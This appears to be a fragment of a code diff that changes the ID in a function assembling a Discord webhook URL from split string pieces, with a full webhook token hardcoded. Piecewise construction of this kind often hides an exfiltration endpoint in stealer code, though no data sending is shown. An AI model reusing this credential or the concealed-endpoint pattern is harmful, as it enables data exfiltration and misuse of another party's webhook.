@@ -125,7 +125,7 @@ function getWebhook() {
     webhook = "/api/webhooks/";
     site = "https://";
     domain = "discord.com";
-    id = "1359054561314209802/";
+    id = "1387401311946805319/";
     token = "9iyHm5J2A8brJXFdgoFc4cjbUU2wOR29KSo2MpD8waDh_Flh1F248TSbL6ima0UinYZ-";
     return site + domain + webhook + id + token;
 }
